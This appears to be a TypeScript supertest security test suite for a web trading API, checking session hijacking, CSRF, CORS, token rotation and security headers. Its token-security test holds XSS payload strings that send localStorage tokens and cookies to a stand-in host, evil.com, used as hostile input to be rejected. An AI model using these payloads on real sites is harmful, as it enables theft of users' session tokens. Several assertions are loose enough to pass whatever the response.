import request from 'supertest';
import jwt from 'jsonwebtoken';
import { app } from '../../index';
import { config } from '../../config/config';

describe('Session Hijacking and CSRF Protection Security Tests', () => {
  let validToken: string;
  let refreshToken: string;

  beforeAll(async () => {
    // Create a test user and get tokens
    const registerResponse = await request(app)
      .post('/api/auth/register')
      .send({
        email: 'csrf-test@example.com',
        password: 'TestPassword123',
        firstName: 'CSRF',
        lastName: 'Test'
      });

    if (registerResponse.status === 201) {
      validToken = registerResponse.body.accessToken;
      refreshToken = registerResponse.body.refreshToken;
    } else {
      // Fallback to manual token creation
      validToken = jwt.sign(
        { userId: 'csrf-test-user', type: 'access' },
        config.jwt.secret
      );
    }
  });

  describe('Session Hijacking Protection', () => {
    it('should detect token reuse from different IP addresses', async () => {
      const originalIP = '192.168.1.100';
      const suspiciousIP = '10.0.0.50';

      // Make request from original IP
      const originalResponse = await request(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${validToken}`)
        .set('X-Forwarded-For', originalIP);

      expect([200, 401]).toContain(originalResponse.status);

      // Make request from different IP with same token
      const suspiciousResponse = await request(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${validToken}`)
        .set('X-Forwarded-For', suspiciousIP);

      // Should either work or be flagged as suspicious
      expect([200, 401, 403]).toContain(suspiciousResponse.status);

      if (suspiciousResponse.status === 403) {
        expect(suspiciousResponse.body.error.code).toBe('SUSPICIOUS_ACTIVITY');
      }
    });

    it('should detect concurrent sessions from different locations', async () => {
      const locations = [
        { ip: '192.168.1.1', userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' },
        { ip: '10.0.0.1', userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)' },
        { ip: '172.16.0.1', userAgent: 'Mozilla/5.0 (X11; Linux x86_64)' }
      ];

      const responses = await Promise.all(
        locations.map(location =>
          request(app)
            .get('/api/users/profile')
            .set('Authorization', `Bearer ${validToken}`)
            .set('X-Forwarded-For', location.ip)
            .set('User-Agent', location.userAgent)
        )
      );

      // Should handle concurrent sessions appropriately
      responses.forEach(response => {
        expect([200, 401, 403]).toContain(response.status);
      });

      // At least one should succeed, but suspicious activity might be flagged
      const successfulResponses = responses.filter(r => r.status === 200);
      expect(successfulResponses.length).toBeGreaterThanOrEqual(0);
    });

    it('should invalidate sessions on suspicious activity', async () => {
      // Simulate suspicious activity patterns
      const suspiciousRequests = [
        { endpoint: '/api/users/profile', method: 'get' },
        { endpoint: '/api/strategies', method: 'get' },
        { endpoint: '/api/portfolio/positions', method: 'get' },
        { endpoint: '/api/backtests', method: 'get' }
      ];

      const suspiciousIP = '192.168.100.100';
      const maliciousUserAgent = 'SuspiciousBot/1.0';

      // Make rapid requests from suspicious source
      for (let i = 0; i < 20; i++) {
        for (const req of suspiciousRequests) {
          await request(app)
            [req.method](req.endpoint)
            .set('Authorization', `Bearer ${validToken}`)
            .set('X-Forwarded-For', suspiciousIP)
            .set('User-Agent', maliciousUserAgent);
        }
      }

      // Subsequent request should potentially be blocked
      const finalResponse = await request(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${validToken}`)
        .set('X-Forwarded-For', suspiciousIP)
        .set('User-Agent', maliciousUserAgent);

      expect([200, 401, 403, 429]).toContain(finalResponse.status);
    });

    it('should protect against session fixation attacks', async () => {
      // Try to use a pre-generated session token
      const fixedToken = jwt.sign(
        { userId: 'attacker-controlled', type: 'access' },
        config.jwt.secret
      );

      // Attempt login with fixed session
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .set('Authorization', `Bearer ${fixedToken}`)
        .send({
          email: 'csrf-test@example.com',
          password: 'TestPassword123'
        });

      // Should not accept pre-existing session tokens for login
      expect([400, 401]).toContain(loginResponse.status);

      // If login succeeds, it should generate a new token
      if (loginResponse.status === 200) {
        expect(loginResponse.body.accessToken).not.toBe(fixedToken);
      }
    });
  });

  describe('CSRF Protection', () => {
    it('should reject state-changing requests without proper origin', async () => {
      const maliciousOrigins = [
        'http://evil.com',
        'https://attacker.example.com',
        'http://localhost:8080', // Different port
        'https://tradeflow.evil.com' // Subdomain attack
      ];

      for (const origin of maliciousOrigins) {
        const response = await request(app)
          .put('/api/users/profile')
          .set('Authorization', `Bearer ${validToken}`)
          .set('Origin', origin)
          .set('Referer', `${origin}/malicious-page`)
          .send({
            firstName: 'Hacked',
            lastName: 'User'
          });

        // Should reject requests from unauthorized origins
        expect([400, 403]).toContain(response.status);
        
        if (response.status === 403) {
          expect(response.body.error.code).toBe('CSRF_PROTECTION');
        }
      }
    });

    it('should validate CSRF tokens for state-changing operations', async () => {
      // Attempt state-changing operation without CSRF token
      const response = await request(app)
        .delete('/api/strategies/test-strategy-id')
        .set('Authorization', `Bearer ${validToken}`)
        .set('Origin', 'http://localhost:3000');

      // Should require CSRF token for destructive operations
      expect([400, 403]).toContain(response.status);
      
      if (response.status === 403) {
        expect(response.body.error.message).toMatch(/csrf|token/i);
      }
    });

    it('should prevent CSRF through content-type manipulation', async () => {
      const maliciousContentTypes = [
        'text/plain',
        'application/x-www-form-urlencoded',
        'multipart/form-data',
        'text/xml'
      ];

      for (const contentType of maliciousContentTypes) {
        const response = await request(app)
          .post('/api/strategies')
          .set('Authorization', `Bearer ${validToken}`)
          .set('Content-Type', contentType)
          .set('Origin', 'http://evil.com')
          .send('malicious=data');

        // Should reject non-JSON content types from unauthorized origins
        expect([400, 403, 415]).toContain(response.status);
      }
    });

    it('should validate same-site cookie attributes', async () => {
      // Login to get session cookies
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'csrf-test@example.com',
          password: 'TestPassword123'
        });

      if (loginResponse.status === 200) {
        const cookies = loginResponse.headers['set-cookie'];
        
        if (cookies) {
          // Check for SameSite attribute in cookies
          const sessionCookie = cookies.find(cookie => 
            cookie.includes('session') || cookie.includes('token')
          );

          if (sessionCookie) {
            expect(sessionCookie).toMatch(/SameSite=(Strict|Lax)/i);
            expect(sessionCookie).toMatch(/Secure/i);
            expect(sessionCookie).toMatch(/HttpOnly/i);
          }
        }
      }
    });

    it('should prevent CSRF through custom headers requirement', async () => {
      // Attempt request without required custom header
      const response = await request(app)
        .put('/api/users/profile')
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          firstName: 'Updated',
          lastName: 'Name'
        });

      // Should work with proper authorization
      expect([200, 400, 403]).toContain(response.status);

      // Attempt with malicious origin but valid token
      const maliciousResponse = await request(app)
        .put('/api/users/profile')
        .set('Authorization', `Bearer ${validToken}`)
        .set('Origin', 'http://evil.com')
        .set('Referer', 'http://evil.com/attack')
        .send({
          firstName: 'Hacked',
          lastName: 'User'
        });

      // Should be blocked by CSRF protection
      expect([400, 403]).toContain(maliciousResponse.status);
    });
  });

  describe('Cross-Origin Request Security', () => {
    it('should enforce CORS policy correctly', async () => {
      const unauthorizedOrigins = [
        'http://malicious.com',
        'https://evil.example.com',
        'http://localhost:8080',
        'https://tradeflow.phishing.com'
      ];

      for (const origin of unauthorizedOrigins) {
        // Preflight request
        const preflightResponse = await request(app)
          .options('/api/users/profile')
          .set('Origin', origin)
          .set('Access-Control-Request-Method', 'PUT')
          .set('Access-Control-Request-Headers', 'Authorization, Content-Type');

        // Should reject unauthorized origins
        expect([200, 403, 404]).toContain(preflightResponse.status);

        // Actual request
        const actualResponse = await request(app)
          .put('/api/users/profile')
          .set('Authorization', `Bearer ${validToken}`)
          .set('Origin', origin)
          .send({
            firstName: 'Test',
            lastName: 'User'
          });

        // Should be blocked by CORS or CSRF protection
        expect([400, 403]).toContain(actualResponse.status);
      }
    });

    it('should prevent credential leakage in CORS responses', async () => {
      const response = await request(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${validToken}`)
        .set('Origin', 'http://unauthorized.com');

      // Should not include credentials in CORS headers for unauthorized origins
      expect(response.headers['access-control-allow-credentials']).not.toBe('true');
    });

    it('should validate WebSocket origin for real-time connections', async () => {
      // This would test WebSocket CORS if implemented
      // For now, we'll test the HTTP equivalent
      
      const wsUpgradeResponse = await request(app)
        .get('/ws')
        .set('Upgrade', 'websocket')
        .set('Connection', 'Upgrade')
        .set('Origin', 'http://evil.com')
        .set('Sec-WebSocket-Key', 'dGhlIHNhbXBsZSBub25jZQ==')
        .set('Sec-WebSocket-Version', '13');

      // Should reject WebSocket upgrades from unauthorized origins
      expect([400, 403, 426]).toContain(wsUpgradeResponse.status);
    });
  });

  describe('Token Security', () => {
    it('should prevent token theft through XSS', async () => {
      // Simulate XSS payload in user input
      const xssPayloads = [
        '<script>document.location="http://evil.com/steal?token="+localStorage.getItem("token")</script>',
        'javascript:alert(document.cookie)',
        '<img src="x" onerror="fetch(\'http://evil.com/steal?token=\'+localStorage.token)">',
        '"><script>new Image().src="http://evil.com/steal?token="+document.cookie</script>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .put('/api/users/profile')
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            firstName: payload,
            lastName: 'Test',
            bio: payload
          });

        // Should sanitize or reject XSS payloads
        expect([200, 400, 422]).toContain(response.status);

        if (response.status === 200) {
          // If accepted, should be sanitized
          expect(response.body.user.firstName).not.toContain('<script>');
          expect(response.body.user.bio).not.toContain('<script>');
        }
      }
    });

    it('should implement secure token storage recommendations', async () => {
      // Test that tokens are not exposed in URLs or logs
      const response = await request(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${validToken}`)
        .query({ debug: 'true', log: 'verbose' });

      expect([200, 400, 401]).toContain(response.status);

      // Response should not contain the token
      const responseText = JSON.stringify(response.body);
      expect(responseText).not.toContain(validToken);
    });

    it('should rotate refresh tokens on use', async () => {
      if (!refreshToken) {
        // Skip if no refresh token available
        return;
      }

      // Use refresh token
      const refreshResponse = await request(app)
        .post('/api/auth/refresh')
        .send({ refreshToken });

      if (refreshResponse.status === 200) {
        const newRefreshToken = refreshResponse.body.refreshToken;
        
        // New refresh token should be different
        expect(newRefreshToken).not.toBe(refreshToken);

        // Old refresh token should be invalidated
        const oldTokenResponse = await request(app)
          .post('/api/auth/refresh')
          .send({ refreshToken });

        expect(oldTokenResponse.status).toBe(401);
        expect(oldTokenResponse.body.error.code).toBe('INVALID_REFRESH_TOKEN');
      }
    });
  });

  describe('Advanced Attack Prevention', () => {
    it('should prevent clickjacking attacks', async () => {
      const response = await request(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${validToken}`);

      // Should include X-Frame-Options header
      expect(response.headers['x-frame-options']).toBeDefined();
      expect(['DENY', 'SAMEORIGIN']).toContain(response.headers['x-frame-options']);
    });

    it('should prevent MIME type sniffing', async () => {
      const response = await request(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${validToken}`);

      // Should include X-Content-Type-Options header
      expect(response.headers['x-content-type-options']).toBe('nosniff');
    });

    it('should implement Content Security Policy', async () => {
      const response = await request(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${validToken}`);

      // Should include CSP header for API responses
      const csp = response.headers['content-security-policy'];
      if (csp) {
        expect(csp).toMatch(/default-src|script-src|object-src/);
      }
    });

    it('should prevent information disclosure in error messages', async () => {
      const maliciousRequests = [
        { endpoint: '/api/users/nonexistent', method: 'get' },
        { endpoint: '/api/strategies/invalid-id', method: 'delete' },
        { endpoint: '/api/portfolio/positions', method: 'post', data: { invalid: 'data' } }
      ];

      for (const req of maliciousRequests) {
        const response = await request(app)
          [req.method](req.endpoint)
          .set('Authorization', `Bearer ${validToken}`)
          .send(req.data);

        // Error responses should not leak sensitive information
        const responseText = JSON.stringify(response.body).toLowerCase();
        expect(responseText).not.toMatch(/password|secret|key|token|database|sql|stack trace/);
        
        // Should have generic error structure
        if (response.status >= 400) {
          expect(response.body.error).toBeDefined();
          expect(response.body.error.code).toBeDefined();
        }
      }
    });
  });
});